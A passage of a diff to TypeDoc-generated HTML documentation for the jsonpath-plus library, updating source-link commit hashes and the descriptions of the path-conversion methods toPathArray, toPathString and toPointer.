class=\"tsd-signature-symbol\">[]</span></h5></li></ul></li></ul></div><h4 class=\"tsd-returns-title\">Returns <span class=\"tsd-signature-type\">any</span></h4><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L215\">jsonpath.d.ts:215</a></li></ul></aside></li></ul></section><section class=\"tsd-panel tsd-member\"><a id=\"toPathArray\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>to<wbr/>Path<wbr/>Array</span><a href=\"#toPathArray\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"toPathArray.toPathArray-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">to<wbr/>Path<wbr/>Array</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">path</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\">[]</span><a href=\"#toPathArray.toPathArray-1\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><div class=\"tsd-comment tsd-typography\"><p>Accepts a normalized or unnormalized path as string and\n converts to an array: for example,\n <code>['$', 'aProperty', 'anotherProperty']</code>.</p>\n-</div><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">path</span>: <span class=\"tsd-signature-type\">string</span></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\">[]</span></h4><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L186\">jsonpath.d.ts:186</a></li></ul></aside></li></ul></section><section class=\"tsd-panel tsd-member\"><a id=\"toPathString\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>to<wbr/>Path<wbr/>String</span><a href=\"#toPathString\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"toPathString.toPathString-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">to<wbr/>Path<wbr/>String</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">path</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span><a href=\"#toPathString.toPathString-1\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><div class=\"tsd-comment tsd-typography\"><p>Accepts a path array and converts to a normalized path string.\n+</div><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">path</span>: <span class=\"tsd-signature-type\">string</span></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\">[]</span></h4><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L186\">jsonpath.d.ts:186</a></li></ul></aside></li></ul></section><section class=\"tsd-panel tsd-member\"><a id=\"toPathString\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>to<wbr/>Path<wbr/>String</span><a href=\"#toPathString\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"toPathString.toPathString-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">to<wbr/>Path<wbr/>String</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">path</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span><a href=\"#toPathString.toPathString-1\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><div class=\"tsd-comment tsd-typography\"><p>Accepts a path array and converts to a normalized path string.\n The string will be in a form like:\n <code>$['aProperty']['anotherProperty][0]</code>.\n The JSONPath terminal constructions <code>~</code> and <code>^</code> and type operators\n like <code>@string()</code> are silently stripped.</p>\n-</div><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">path</span>: <span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\">[]</span></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <span class=\"tsd-signature-type\">string</span></h4><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L195\">jsonpath.d.ts:195</a></li></ul></aside></li></ul></section><section class=\"tsd-panel tsd-member\"><a id=\"toPointer\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>to<wbr/>Pointer</span><a href=\"#toPointer\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"toPointer.toPointer-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">to<wbr/>Pointer</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">path</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">any</span><a href=\"#toPointer.toPointer-1\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><div class=\"tsd-comment tsd-typography\"><p>Accepts a path array and converts to a JSON Pointer.</p>\n+</div><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">path</span>: <span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\">[]</span></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <span class=\"tsd-signature-type\">string</span></h4><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L195\">jsonpath.d.ts:195</a></li></ul></aside></li></ul></section><section class=\"tsd-panel tsd-member\"><a id=\"toPointer\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>to<wbr/>Pointer</span><a href=\"#toPointer\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"toPointer.toPointer-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">to<wbr/>Pointer</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">path</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">any</span><a href=\"#toPointer.toPointer-1\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><div class=\"tsd-comment tsd-typography\"><p>Accepts a path array and converts to a JSON Pointer.</p>\n <p>The string will be in a form like: <code>/aProperty/anotherProperty/0</code>\n (with any <code>~</code> and <code>/</code> internal characters escaped as per the JSON\n Pointer spec).</p>\n <p>The JSONPath terminal constructions <code>~</code> and <code>^</code> and type operators\n like <code>@string()</code> are silently stripped.</p>\n-</div><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">path</span>: <span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\">[]</span></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <span class=\"tsd-signature-type\">any</span></h4><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L207\">jsonpath.d.ts:207</a></li></ul></aside></li></ul></section></section></details></div><div class=\"col-sidebar\"><div class=\"page-menu\"><div class=\"tsd-navigation settings\"><details class=\"tsd-accordion\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Settings</h3></summary><div class=\"tsd-accordion-details\"><div class=\"tsd-filter-visibility\"><span class=\"settings-label\">Member Visibility</span><ul id=\"tsd-filter-options\"><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-protected\" name=\"protected\"/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Protected</span></label></li><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-inherited\" name=\"inherited\" checked/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Inherited</span></label></li></ul></div><div class=\"tsd-theme-toggle\"><label class=\"settings-label\" for=\"tsd-theme\">Theme</label><select id=\"tsd-theme\"><option value=\"os\">OS</option><option value=\"light\">Light</option><option value=\"dark\">Dark</option></select></div></div></details></div><details open class=\"tsd-accordion tsd-page-navigation\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>On This Page</h3></summary><div class=\"tsd-accordion-details\"><details open class=\"tsd-accordion tsd-page-navigation-section\"><summary class=\"tsd-accordion-summary\" data-key=\"tsd-otp-Constructors\"><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Constructors</summary><div><a href=\"#constructor\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-512\"></use></svg><span>constructor</span></a></div></details><details open class=\"tsd-accordion tsd-page-navigation-section\"><summary class=\"tsd-accordion-summary\" data-key=\"tsd-otp-Properties\"><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Properties</summary><div><a href=\"#cache\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>cache</span></a></div></details><details open class=\"tsd-accordion tsd-page-navigation-section\"><summary class=\"tsd-accordion-summary\" data-key=\"tsd-otp-Methods\"><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Methods</summary><div><a href=\"#evaluate\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>evaluate</span></a><a href=\"#toPathArray\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>to<wbr/>Path<wbr/>Array</span></a><a href=\"#toPathString\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>to<wbr/>Path<wbr/>String</span></a><a href=\"#toPointer\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>to<wbr/>Pointer</span></a></div></details></div></details></div><div class=\"site-menu\"><nav class=\"tsd-navigation\"><a href=\"../modules.html\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1\"></use></svg><span>jsonpath-plus</span></a><ul class=\"tsd-small-nested-navigation\" id=\"tsd-nav-container\" data-base=\"..\"><li>Loading...</li></ul></nav></div></div></div><footer><p class=\"tsd-generator\">Generated using <a href=\"https://typedoc.org/\" target=\"_blank\">TypeDoc</a></p></footer><div class=\"overlay\"></div></body></html>\n+</div><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">path</span>: <span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\">[]</span></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <span class=\"tsd-signature-type\">any</span></h4><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L207\">jsonpath.d.ts:207</a></li></ul></aside></li></ul></section></section></details></div><div class=\"col-sidebar\"><div class=\"page-menu\"><div class=\"tsd-navigation settings\"><details class=\"tsd-accordion\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Settings</h3></summary><div class=\"tsd-accordion-details\"><div class=\"tsd-filter-visibility\"><span class=\"settings-label\">Member Visibility</span><ul id=\"tsd-filter-options\"><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-protected\" name=\"protected\"/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Protected</span></label></li><li class=\"tsd-filter-item\"><label class=\"tsd-filter-input\"><input type=\"checkbox\" id=\"tsd-filter-inherited\" name=\"inherited\" checked/><svg width=\"32\" height=\"32\" viewBox=\"0 0 32 32\" aria-hidden=\"true\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></svg><span>Inherited</span></label></li></ul></div><div class=\"tsd-theme-toggle\"><label class=\"settings-label\" for=\"tsd-theme\">Theme</label><select id=\"tsd-theme\"><option value=\"os\">OS</option><option value=\"light\">Light</option><option value=\"dark\">Dark</option></select></div></div></details></div><details open class=\"tsd-accordion tsd-page-navigation\"><summary class=\"tsd-accordion-summary\"><h3><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>On This Page</h3></summary><div class=\"tsd-accordion-details\"><details open class=\"tsd-accordion tsd-page-navigation-section\"><summary class=\"tsd-accordion-summary\" data-key=\"tsd-otp-Constructors\"><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Constructors</summary><div><a href=\"#constructor\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-512\"></use></svg><span>constructor</span></a></div></details><details open class=\"tsd-accordion tsd-page-navigation-section\"><summary class=\"tsd-accordion-summary\" data-key=\"tsd-otp-Properties\"><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Properties</summary><div><a href=\"#cache\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>cache</span></a></div></details><details open class=\"tsd-accordion tsd-page-navigation-section\"><summary class=\"tsd-accordion-summary\" data-key=\"tsd-otp-Methods\"><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg>Methods</summary><div><a href=\"#evaluate\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>evaluate</span></a><a href=\"#toPathArray\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>to<wbr/>Path<wbr/>Array</span></a><a href=\"#toPathString\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>to<wbr/>Path<wbr/>String</span></a><a href=\"#toPointer\" class=\"\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>to<wbr/>Pointer</span></a></div></details></div></details></div><div class=\"site-menu\"><nav class=\"tsd-navigation\"><a href=\"../modules.html\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1\"></use></svg><span>jsonpath-plus</span></a><ul class=\"tsd-small-nested-navigation\" id=\"tsd-nav-container\" data-base=\"..\"><li>Loading...</li></ul></nav></div></div></div><footer><p class=\"tsd-generator\">Generated using <a href=\"https://typedoc.org/\" target=\"_blank\">TypeDoc</a></p></footer><div class=\"overlay\"></div></body></html>\n```\n\nFilename: docs/ts/functions/JSONPath.html:\n```\n@@ -1,22 +1,22 @@\n-<!DOCTYPE html><html class=\"default\" lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\"/><title>JSONPath | jsonpath-plus</title><meta name=\"description\" content=\"Documentation for jsonpath-plus\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"../assets/style.css\"/><link rel=\"stylesheet\" href=\"../assets/highlight.css\"/><script defer src=\"../assets/main.js\"></script><script async src=\"../assets/icons.js\" id=\"tsd-icons-script\"></script><script async src=\"../assets/search.js\" id=\"tsd-search-script\"></script><script async src=\"../assets/navigation.js\" id=\"tsd-nav-script\"></script></head><body><script>document.documentElement.dataset.theme = localStorage.getItem(\"tsd-theme\") || \"os\";document.body.style.display=\"none\";setTimeout(() => app?app.showPage():document.body.style.removeProperty(\"display\"),500)</script><header class=\"tsd-page-toolbar\"><div class=\"tsd-toolbar-contents container\"><div class=\"table-cell\" id=\"tsd-search\" data-base=\"..\"><div class=\"field\"><label for=\"tsd-search-field\" class=\"tsd-widget tsd-toolbar-icon search no-caption\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-search\"></use></svg></label><input type=\"text\" id=\"tsd-search-field\" aria-label=\"Search\"/></div><div class=\"field\"><div id=\"tsd-toolbar-links\"></div></div><ul class=\"results\"><li class=\"state loading\">Preparing search index...</li><li class=\"state failure\">The search index is not available</li></ul><a href=\"../index.html\" class=\"title\">jsonpath-plus</a></div><div class=\"table-cell\" id=\"tsd-widgets\"><a href=\"#\" class=\"tsd-widget tsd-toolbar-icon menu no-caption\" data-toggle=\"menu\" aria-label=\"Menu\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-menu\"></use></svg></a></div></div></header><div class=\"container container-main\"><div class=\"col-content\"><div class=\"tsd-page-title\"><ul class=\"tsd-breadcrumb\"><li><a href=\"../modules.html\">jsonpath-plus</a></li><li><a href=\"JSONPath.html\">JSONPath</a></li></ul><h1>Function JSONPath</h1></div><section class=\"tsd-panel\"><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"JSONPath\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">JSONPath</span><span class=\"tsd-signature-symbol\">&lt;</span><a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"JSONPath.html#JSONPath.T\">T</a><span class=\"tsd-signature-symbol\">&gt;</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">options</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><a href=\"../classes/JSONPathClass.html\" class=\"tsd-signature-type tsd-kind-class\">JSONPathClass</a><a href=\"#JSONPath\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><section class=\"tsd-panel\"><h4>Type Parameters</h4><ul class=\"tsd-type-parameter-list\"><li><span><a id=\"JSONPath.T\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-type-parameter\">T</span> = <span class=\"tsd-signature-type\">any</span></span></li></ul></section><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">options</span>: <a href=\"../interfaces/JSONPathOptionsAutoStart.html\" class=\"tsd-signature-type tsd-kind-interface\">JSONPathOptionsAutoStart</a></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <a href=\"../classes/JSONPathClass.html\" class=\"tsd-signature-type tsd-kind-class\">JSONPathClass</a></h4><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L225\">jsonpath.d.ts:225</a></li></ul></aside></li><li class=\"tsd-signature tsd-anchor-link\"><a id=\"JSONPath-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">JSONPath</span><span class=\"tsd-signature-symbol\">&lt;</span><a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"JSONPath.html#JSONPath-1.T-1\">T</a><span class=\"tsd-signature-symbol\">&gt;</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">options</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"../interfaces/JSONPathCallable.html#JSONPathCallable-1.T-1\">T</a><a href=\"#JSONPath-1\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><section class=\"tsd-panel\"><h4>Type Parameters</h4><ul class=\"tsd-type-parameter-list\"><li><span><a id=\"JSONPath-1.T-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-type-parameter\">T</span> = <span class=\"tsd-signature-type\">any</span></span></li></ul></section><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">options</span>: <a href=\"../interfaces/JSONPathOptions.html\" class=\"tsd-signature-type tsd-kind-interface\">JSONPathOptions</a></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"../interfaces/JSONPathCallable.html#JSONPathCallable-1.T-1\">T</a></h4><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L225\">jsonpath.d.ts:225</a></li></ul></aside></li><li class=\"tsd-signature tsd-anchor-link\"><a id=\"JSONPath-2\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">JSONPath</span><span class=\"tsd-signature-symbol\">&lt;</span><a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"JSONPath.html#JSONPath-2.T-2\">T</a><span class=\"tsd-signature-symbol\">&gt;</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">path</span>, <span class=\"tsd-kind-parameter\">json</span>, <span class=\"tsd-kind-parameter\">callback</span>, <span class=\"tsd-kind-parameter\">otherTypeCallback</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"../interfaces/JSONPathCallable.html#JSONPathCallable-2.T-2\">T</a><a href=\"#JSONPath-2\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><section class=\"tsd-panel\"><h4>Type Parameters</h4><ul class=\"tsd-type-parameter-list\"><li><span><a id=\"JSONPath-2.T-2\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-type-parameter\">T</span> = <span class=\"tsd-signature-type\">any</span></span></li></ul></section><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">path</span>: <span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\"> | </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></span></li><li><span><span class=\"tsd-kind-parameter\">json</span>: <br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">string</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">number</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">object</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></span></li><li><span><span class=\"tsd-kind-parameter\">callback</span>: <a href=\"../types/JSONPathCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathCallback</a></span></li><li><span><span class=\"tsd-kind-parameter\">otherTypeCallback</span>: <a href=\"../types/JSONPathOtherTypeCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathOtherTypeCallback</a></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"../interfaces/JSONPathCallable.html#JSONPathCallable-2.T-2\">T</a></h4><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L225\">jsonpath.d.ts:225</a></li></ul></aside></li></ul></section><section class=\"tsd-panel-group tsd-index-group\"><section class=\"tsd-panel tsd-index-panel\"><details class=\"tsd-index-content tsd-accordion\" open><summary class=\"tsd-accordion-summary tsd-index-summary\"><h5 class=\"tsd-index-heading uppercase\" role=\"button\" aria-expanded=\"false\" tabIndex=\"0\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronSmall\"></use></svg> Index</h5></summary><div class=\"tsd-accordion-details\"><section class=\"tsd-index-section\"><h3 class=\"tsd-index-heading\">Properties</h3><div class=\"tsd-index-list\"><a href=\"JSONPath.html#cache\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 